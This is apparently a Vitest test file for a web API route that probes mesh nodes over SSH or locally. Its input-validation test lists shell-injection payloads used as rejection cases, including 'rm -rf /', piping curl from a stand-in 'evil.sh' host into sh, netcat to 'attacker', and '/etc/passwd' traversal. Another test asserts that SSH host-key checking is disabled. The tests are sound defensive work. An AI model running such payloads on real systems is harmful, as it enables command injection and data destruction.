import { describe, it, expect, beforeEach, vi } from 'vitest';

/**
 * Probing one node.
 *
 * The hostname arrives in a query string and ends up inside a shell command,
 * which is why the first thing this route does is refuse anything that is not
 * a hostname. The second is to notice when the host it was asked about is the
 * machine it is already running on — going out over SSH to reach ourselves
 * costs a round trip and fails outright on a node with no key back to itself.
 */

const execSync = vi.fn();
vi.mock('child_process', () => ({ execSync: (...a: unknown[]) => execSync(...a) }));

const parseProbeOutput = vi.fn((raw: string, host: string) => ({ hostname: host, reachable: true, raw }));
vi.mock('@/lib/node-probe', async (orig) => ({
  ...(await orig() as object),
  parseProbeOutput: (r: string, h: string) => parseProbeOutput(r, h),
}));

/** The probe is one execSync call; which machine it lands on is in the command. */
const probeCommands = () =>
  execSync.mock.calls.map((c) => String(c[0])).filter((c) => c.includes('SECTION:HOSTNAME'));
const probedOverSsh = () => probeCommands().filter((c) => c.startsWith('ssh '));
const probedLocally = () => probeCommands().filter((c) => c.startsWith('bash -c'));

const { GET } = await import('./route');

const get = (query: string) =>
  GET({ nextUrl: new URL(`http://localhost:3000/api/mesh/node${query}`) } as never);

/** Answer `hostname` with a name, and the probe itself with output. */
function machine({ name = 'some-other-box', fqdn = name, probe = '===SECTION:HOSTNAME===\nbox' } = {}) {
  execSync.mockImplementation((cmd: string) => {
    if (cmd === 'hostname') return `${name}\n`;
    if (cmd.startsWith('hostname -f')) return `${fqdn}\n`;
    return probe;
  });
}

beforeEach(() => { vi.clearAllMocks(); machine(); });

describe('what it refuses', () => {
  it('will not probe without being told what to probe', async () => {
    const res = await get('');
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBe('Missing host parameter');
  });

  it('refuses anything that is not a hostname', async () => {
    // This string reaches a shell. Every one of these is a way out of it.
    for (const host of [
      'cammy; rm -rf /', 'cammy && curl evil.sh | sh', 'cammy`whoami`',
      'cammy$(id)', 'cammy|nc attacker 1', 'cammy\nrm -rf /', 'cammy /etc/passwd',
      "cammy'", 'cammy"', '../../etc/passwd',
    ]) {
      const res = await get(`?host=${encodeURIComponent(host)}`);
      expect(res.status, host).toBe(400);
      expect((await res.json()).error).toBe('Invalid host');
    }
    expect(probeCommands()).toHaveLength(0);
  });

  it('accepts the hostnames our mesh actually uses', async () => {
    for (const host of ['cammy', 'cammy.foxhop.net', '4090-ai.foxhop.net', 'node_2', 'localhost']) {
      expect((await get(`?host=${host}`)).status, host).toBe(200);
    }
  });
});

describe('recognising itself', () => {
  it('reads localhost directly rather than over ssh', async () => {
    await get('?host=localhost');
    expect(probedLocally()).toHaveLength(1);
    expect(probedOverSsh()).toHaveLength(0);
  });

  it('recognises its own short hostname', async () => {
    // The mesh knows this node as `cammy`. Reaching it over SSH costs a
    // round trip and fails outright on a node with no key back to itself.
    machine({ name: 'cammy' });
    await get('?host=cammy');
    expect(probedLocally()).toHaveLength(1);
    expect(probedOverSsh()).toHaveLength(0);
  });

  it('recognises its own fully-qualified name', async () => {
    machine({ name: 'cammy', fqdn: 'cammy.foxhop.net' });
    await get('?host=cammy.foxhop.net');
    expect(probedLocally()).toHaveLength(1);
  });

  it('goes over ssh for anybody else', async () => {
    await get('?host=neoblanka');
    expect(probedOverSsh()).toHaveLength(1);
    expect(probedOverSsh()[0]).toContain(' neoblanka ');
    expect(probedLocally()).toHaveLength(0);
  });

  it('gives ssh a deadline and does not stop for a host key', async () => {
    // Without both, a new node hangs this route on an interactive prompt
    // until the request is abandoned.
    await get('?host=neoblanka');
    expect(probedOverSsh()[0]).toContain('ConnectTimeout=5');
    expect(probedOverSsh()[0]).toContain('StrictHostKeyChecking=no');
  });

  it('falls back to ssh when it cannot ask its own name', async () => {
    // A container with no `hostname` binary. Treating the failure as "this
    // is me" would probe the wrong machine and report it as the right one.
    execSync.mockImplementation((cmd: string) => {
      if (String(cmd).startsWith('hostname')) throw new Error('not found');
      return '===SECTION:HOSTNAME===\nbox';
    });
    await get('?host=neoblanka');
    expect(probedOverSsh()).toHaveLength(1);
  });
});

describe('when a node does not answer', () => {
  it('says so, rather than returning a node with every field empty', async () => {
    // A parse of empty output produces a node card full of zeros, which
    // reads as an idle machine rather than an unreachable one.
    machine({ probe: '' });
    const res = await get('?host=neoblanka');
    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({
      hostname: 'neoblanka', reachable: false,
      error: 'Probe failed — host unreachable or timed out',
    });
    expect(parseProbeOutput).not.toHaveBeenCalled();
  });

  it('stamps the attempt, so a stale card can be told from a fresh failure', async () => {
    machine({ probe: 'ssh: connect to host neoblanka port 22: No route to host' });
    const body = await (await get('?host=neoblanka')).json();
    expect(body.probedAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
  });

  it('treats partial output as a failure rather than parsing half a node', async () => {
    machine({ probe: '===SECTION:CPU===\n8\n' });
    expect((await (await get('?host=neoblanka')).json()).reachable).toBe(false);
  });
});

describe('a node that does answer', () => {
  it('parses the probe and reports it under the name that was asked for', async () => {
    // The card was opened for `neoblanka`; answering under whatever the box
    // calls itself would leave the page unable to match the two.
    machine({ probe: '===SECTION:HOSTNAME===\nremote-box' });
    const body = await (await get('?host=neoblanka')).json();
    expect(body).toMatchObject({ hostname: 'neoblanka', reachable: true });
    expect(parseProbeOutput).toHaveBeenCalledWith(expect.stringContaining('remote-box'), 'neoblanka');
  });
});
